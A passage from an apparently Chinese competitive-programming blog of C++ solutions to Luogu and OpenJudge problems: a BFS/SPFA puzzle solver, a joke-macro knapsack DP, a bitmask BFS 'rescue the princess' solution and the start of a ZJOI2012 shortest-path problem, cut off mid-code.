class_">point</span> &#123;</span><br><span class="line">    <span class="type">int</span> x, y, step;</span><br><span class="line">    <span class="built_in">point</span>(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> s) :</span><br><span class="line">        <span class="built_in">x</span>(x), <span class="built_in">y</span>(y), <span class="built_in">step</span>(s) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">bool</span> visited[SIZE][SIZE];</span><br><span class="line"><span class="type">int</span> dx[<span class="number">4</span>] = &#123; <span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> dy[<span class="number">4</span>] = &#123; <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span> &#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">priceToMoveTo</span><span class="params">(<span class="type">int</span> StartX, <span class="type">int</span> StartY, <span class="type">int</span> EndX, <span class="type">int</span> EndY, <span class="type">int</span> BlankX, <span class="type">int</span> BlankY)</span> </span>&#123;<span class="comment">//bfs</span></span><br><span class="line">    queue&lt;point&gt;joblist;</span><br><span class="line">    <span class="keyword">if</span> (StartX == EndX&amp;&amp;StartY == EndY)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    joblist.<span class="built_in">push</span>(<span class="built_in">point</span>(StartX, StartY, <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">memset</span>(visited, <span class="number">0</span>, <span class="keyword">sizeof</span> visited);</span><br><span class="line">    visited[StartX][StartY] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (!joblist.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        point current = joblist.<span class="built_in">front</span>();</span><br><span class="line">        joblist.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">if</span> (current.x == EndX&amp;¤t.y == EndY)<span class="keyword">return</span> current.step;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="comment">/*ille*/</span><span class="keyword">if</span> (visited[current.x + dx[i]][current.y + dy[i]])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">/*fixed*/</span><span class="keyword">if</span> (!map[current.x + dx[i]][current.y + dy[i]])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">/*blank*/</span><span class="keyword">if</span> (current.x + dx[i] == BlankX &amp;&amp; current.y + dy[i] == BlankY)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            visited[current.x + dx[i]][current.y + dy[i]] = <span class="number">1</span>;</span><br><span class="line">            joblist.<span class="built_in">push</span>(<span class="built_in">point</span>(current.x + dx[i], current.y + dy[i], current.step + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">16843009</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> id[SIZE][SIZE][<span class="number">4</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RenewID</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> temp = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= SizeY; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= SizeX; j++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">                <span class="keyword">if</span> (map[i][j] &amp;&amp; map[i + dx[k]][j + dy[k]])</span><br><span class="line">                    id[i][j][k] = temp++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">readMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin &gt;&gt; SizeY &gt;&gt; SizeX &gt;&gt; gamePlays;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= SizeY; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= SizeX; j++)</span><br><span class="line">            cin &gt;&gt; map[i][j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">readMap</span>();</span><br><span class="line">    SPFA instG;</span><br><span class="line">    <span class="built_in">RenewID</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= SizeY; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= SizeX; j++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">                <span class="keyword">if</span> (id[i][j][k])</span><br><span class="line">                    instG.<span class="built_in">connect</span>(</span><br><span class="line">                        id[i][j][k],</span><br><span class="line">                        id[i + dx[k]][j + dy[k]][k ^ <span class="number">1</span>],</span><br><span class="line">                        <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> a = <span class="number">1</span>; a &lt;= SizeY; a++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> b = <span class="number">1</span>; b &lt;= SizeX; b++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i == j)<span class="keyword">continue</span>;</span><br><span class="line">                    <span class="keyword">if</span> (!id[a][b][i] || !id[a][b][j])<span class="keyword">continue</span>;</span><br><span class="line">                    instG.<span class="built_in">connect</span>(</span><br><span class="line">                        id[a][b][i],</span><br><span class="line">                        id[a][b][j],</span><br><span class="line">                        <span class="built_in">priceToMoveTo</span>(a + dx[i], b + dy[i], a + dx[j], b + dy[j], a, b)</span><br><span class="line">                        );</span><br><span class="line">                &#125;</span><br><span class="line">    <span class="keyword">while</span> (gamePlays--) &#123;</span><br><span class="line">        cin &gt;&gt; EmptyX &gt;&gt; EmptyY &gt;&gt;</span><br><span class="line">            StartX &gt;&gt; StartY &gt;&gt;</span><br><span class="line">            TargX &gt;&gt; TargY;</span><br><span class="line">        <span class="comment">/////////////</span></span><br><span class="line">        <span class="keyword">if</span> (StartX == TargX&amp;&amp;StartY == TargY) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="number">0</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        instG.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (id[StartX][StartY][i]) &#123;</span><br><span class="line">                instG.joblist.<span class="built_in">push</span>(id[StartX][StartY][i]);</span><br><span class="line">                instG.visited[id[StartX][StartY][i]] = <span class="number">1</span>;</span><br><span class="line">                instG.dis[id[StartX][StartY][i]] =</span><br><span class="line">                    <span class="built_in">priceToMoveTo</span>(EmptyX, EmptyY, StartX + dx[i], StartY + dy[i], StartX, StartY);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        instG.<span class="built_in">work</span>();</span><br><span class="line">        <span class="comment">/////////////</span></span><br><span class="line">        <span class="type">int</span> Min = <span class="number">16843009</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (id[TargX][TargY][i] &amp;&amp; instG.dis[id[TargX][TargY][i]] &lt; Min)</span><br><span class="line">                Min = instG.dis[id[TargX][TargY][i]];</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; (Min == <span class="number">16843009</span> ? <span class="number">-1</span> : Min) &lt;&lt; endl;</span><br><span class="line">        <span class="comment">////////////</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="找啊找啊找GF">找啊找啊找GF</h2><blockquote><p>来源: luoguP1509</p></blockquote><blockquote><p>写过的最有意思的题解233333</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> 我开始审视这个妹子，心中想到 how_sad = false;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 那真是个悲伤的故事 how_sad = true;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 拿下这个妹子就多个妹子陪 (dp[j][k] &lt; dp[j - money_cost[i]][k - rp_cost[i]] + 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 这个妹子比前面那个省事 (dp[j][k] == dp[j - money_cost[i]][k - rp_cost[i]] \</span></span><br><span class="line"><span class="meta">                    &amp;&amp; time[j][k] &gt; time[j - money_cost[i]][k - rp_cost[i]] + time_cost[i])</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 如果 <span class="keyword">if</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 而且 &amp;&amp;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 或者 ||</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 我 (</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 的话 )</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 没钱没人品  j &lt; money_cost[i] || k &lt; rp_cost[i]</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 有钱而且有人品 (!how_sad)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 那我就 )&#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 推倒她 dp[j][k] = dp[j - money_cost[i]][k - rp_cost[i]] + 1; \</span></span><br><span class="line"><span class="meta">                        time[j][k] = time[j - money_cost[i]][k - rp_cost[i]] + time_cost[i];</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 的说 &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 如果推倒她并没有什么用 <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 那我管她呢 dp[j][k] = dp[j][k], time[j][k] = time[j][k];</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_GIRLS 101</span></span><br><span class="line"><span class="type">int</span> money_cost[MAX_GIRLS], rp_cost[MAX_GIRLS], time_cost[MAX_GIRLS];</span><br><span class="line"><span class="type">int</span> my_money, my_rp;</span><br><span class="line"><span class="type">int</span> dp[MAX_GIRLS][MAX_GIRLS],</span><br><span class="line">time[MAX_GIRLS][MAX_GIRLS];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> girls; cin &gt;&gt; girls;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= girls; i++)</span><br><span class="line">        cin</span><br><span class="line">        &gt;&gt; money_cost[i]</span><br><span class="line">        &gt;&gt; rp_cost[i]</span><br><span class="line">        &gt;&gt; time_cost[i];</span><br><span class="line">    cin &gt;&gt; my_money &gt;&gt; my_rp;</span><br><span class="line">    <span class="type">bool</span> how_sad;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= girls; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = my_money; j&gt;<span class="number">0</span>; j--)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = my_rp; k &gt; <span class="number">0</span>; k--) &#123;</span><br><span class="line">                我开始审视这个妹子，心中想到</span><br><span class="line">                如果 我 没钱没人品 的话</span><br><span class="line">                那真是个悲伤的故事</span><br><span class="line">                如果 我 有钱而且有人品 而且 我</span><br><span class="line">                拿下这个妹子就多个妹子陪</span><br><span class="line">                或者 这个妹子比前面那个省事 的话</span><br><span class="line">                那我就 推倒她 的说</span><br><span class="line">                如果推倒她并没有什么用</span><br><span class="line">                那我管她呢</span><br><span class="line">            &#125;</span><br><span class="line">    cout &lt;&lt; time[my_money][my_rp];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="拯救公主">拯救公主</h2><blockquote><p>来源: <a href="http://noi.openjudge.cn/ch0205/7221/">http://noi.openjudge.cn/ch0205/7221/</a></p></blockquote><p>带状态的bfs，变量命名鬼才</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Never 0x7ffff</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> princeLocX, princeLocY;</span><br><span class="line"><span class="type">int</span> princessLocX, princessLocY;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">point</span> &#123;</span><br><span class="line"><span class="type">int</span> x, y;</span><br><span class="line"><span class="type">int</span> kindsOfGemsCollected, timePassed;</span><br><span class="line"><span class="built_in">point</span>(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> Info, <span class="type">int</span> time) &#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;x = x;</span><br><span class="line"><span class="keyword">this</span>-&gt;y = y;</span><br><span class="line"><span class="keyword">this</span>-&gt;kindsOfGemsCollected = Info;</span><br><span class="line">timePassed = time;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">portalsMadeByThoughtfulMe</span> &#123;</span><br><span class="line"><span class="type">int</span> x, y;</span><br><span class="line">&#125;portalList[<span class="number">15</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sizeY, sizeX, kindsOfGemsTOCollect;</span><br><span class="line"><span class="type">int</span> dirX[<span class="number">4</span>] = &#123; <span class="number">1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> dirY[<span class="number">4</span>] = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">-1</span> &#125;;</span><br><span class="line"><span class="type">int</span> TimeToSavePrincess = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> map[<span class="number">210</span>][<span class="number">210</span>];</span><br><span class="line"><span class="type">bool</span> visited[<span class="number">210</span>][<span class="number">210</span>][<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">allGemsAreCollected</span><span class="params">(<span class="type">int</span> CollectedGemInfo)</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> cntCollected = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> ((CollectedGemInfo &gt;&gt; i) &amp; <span class="number">1</span>)</span><br><span class="line">cntCollected++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (cntCollected &gt;= kindsOfGemsTOCollect);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">reachable</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> GemInfo)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (x &gt;= <span class="number">0</span> &amp;&amp; x &lt; sizeY &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt; sizeX &amp;&amp; map[x][y] != <span class="string">&#x27;#&#x27;</span> &amp;&amp; visited[x][y][GemInfo] == <span class="literal">false</span>)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> startX, <span class="type">int</span> startY, <span class="type">const</span> <span class="type">int</span> targetX, <span class="type">const</span> <span class="type">int</span> targetY, <span class="type">int</span> cntPortal)</span> </span>&#123;</span><br><span class="line">queue&lt;point&gt; bfsCore;</span><br><span class="line">bfsCore.<span class="built_in">push</span>(<span class="built_in">point</span>(startX, startY, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"><span class="keyword">while</span> (!bfsCore.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">point currentLoc = bfsCore.<span class="built_in">front</span>();</span><br><span class="line">bfsCore.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">if</span> (currentLoc.x == targetX &amp;&amp; currentLoc.y == targetY &amp;&amp; <span class="built_in">allGemsAreCollected</span>(currentLoc.kindsOfGemsCollected)) &#123;</span><br><span class="line">TimeToSavePrincess = currentLoc.timePassed;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (map[currentLoc.x][currentLoc.y] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line"><span class="type">int</span> nextX = currentLoc.x + dirX[i];</span><br><span class="line"><span class="type">int</span> nextY = currentLoc.y + dirY[i];</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">reachable</span>(nextX, nextY, currentLoc.kindsOfGemsCollected)) &#123;</span><br><span class="line">visited[nextX][nextY][currentLoc.kindsOfGemsCollected] = <span class="literal">true</span>;</span><br><span class="line">bfsCore.<span class="built_in">push</span>(<span class="built_in">point</span>(nextX, nextY, currentLoc.kindsOfGemsCollected, currentLoc.timePassed + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (map[currentLoc.x][currentLoc.y] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; map[currentLoc.x][currentLoc.y] &lt;= <span class="string">&#x27;4&#x27;</span>) &#123;</span><br><span class="line"><span class="type">int</span> newGemInfo = currentLoc.kindsOfGemsCollected | (<span class="number">1</span> &lt;&lt; (map[currentLoc.x][currentLoc.y] - <span class="string">&#x27;0&#x27;</span>));</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line"><span class="type">int</span> nextX = currentLoc.x + dirX[i];</span><br><span class="line"><span class="type">int</span> nextY = currentLoc.y + dirY[i];</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">reachable</span>(nextX, nextY, newGemInfo)) &#123;</span><br><span class="line">visited[nextX][nextY][newGemInfo] = <span class="literal">true</span>;</span><br><span class="line">bfsCore.<span class="built_in">push</span>(<span class="built_in">point</span>(nextX, nextY, newGemInfo, currentLoc.timePassed + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (map[currentLoc.x][currentLoc.y] == <span class="string">&#x27;$&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cntPortal; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line"><span class="type">int</span> nextX = portalList[i].x + dirX[j];</span><br><span class="line"><span class="type">int</span> nextY = portalList[i].y + dirY[j];</span><br><span class="line"><span class="keyword">if</span> (nextX &gt;= <span class="number">0</span> &amp;&amp; nextX &lt; sizeY &amp;&amp; nextY &gt;= <span class="number">0</span> &amp;&amp; nextY &lt; sizeX &amp;&amp; map[nextX][nextY] != <span class="string">&#x27;#&#x27;</span> &amp;&amp; visited[nextX][nextY][currentLoc.kindsOfGemsCollected] == <span class="literal">false</span>) &#123;</span><br><span class="line">visited[nextX][nextY][currentLoc.kindsOfGemsCollected] = <span class="literal">true</span>;</span><br><span class="line">bfsCore.<span class="built_in">push</span>(<span class="built_in">point</span>(nextX, nextY, currentLoc.kindsOfGemsCollected, currentLoc.timePassed + <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">TimeToSavePrincess = Never;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> cases;</span><br><span class="line">cin &gt;&gt; cases;</span><br><span class="line"><span class="keyword">while</span> (cases--) &#123;</span><br><span class="line"><span class="built_in">memset</span>(visited, <span class="number">0</span>, <span class="built_in">sizeof</span>(visited));</span><br><span class="line"><span class="comment">//attention::</span></span><br><span class="line"><span class="comment">//there&#x27;s difference between prince and princess!!!!</span></span><br><span class="line"><span class="comment">//prince is man and princess is woman!!!!</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">cin &gt;&gt; sizeY &gt;&gt; sizeX &gt;&gt; kindsOfGemsTOCollect;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; sizeY; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; sizeX; j++) &#123;</span><br><span class="line">cin &gt;&gt; map[i][j];</span><br><span class="line"><span class="keyword">switch</span> (map[i][j]) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;$&#x27;</span>:</span><br><span class="line">portalList[cnt].x = i;</span><br><span class="line">portalList[cnt].y = j;</span><br><span class="line">cnt++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">princeLocX = i;</span><br><span class="line">princeLocY = j;</span><br><span class="line">map[i][j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">princessLocX = i;</span><br><span class="line">princessLocY = j;</span><br><span class="line">map[i][j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">bfs</span>(princeLocX, princeLocY, princessLocX, princessLocY, cnt);</span><br><span class="line"><span class="keyword">if</span> (TimeToSavePrincess != Never)</span><br><span class="line">cout &lt;&lt; TimeToSavePrincess &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;oop!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="旅游">旅游</h2><blockquote><p>来源: luoguP2610/ZJOI2012</p></blockquote><p>由于这样的图一定有：连了两条边的点有且仅有两个，这两个点之间的路径能够通过所有的城市<br>所以就是要找到任意一个连了两条边的点<br>对于任意的点，最短路径最长的那个节点总是如上所述的点。<br>所以对任意节点SPFA，然后找到$max(dis[i])$,再从这里重新SPFA，$output(max(dis[i]))$</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 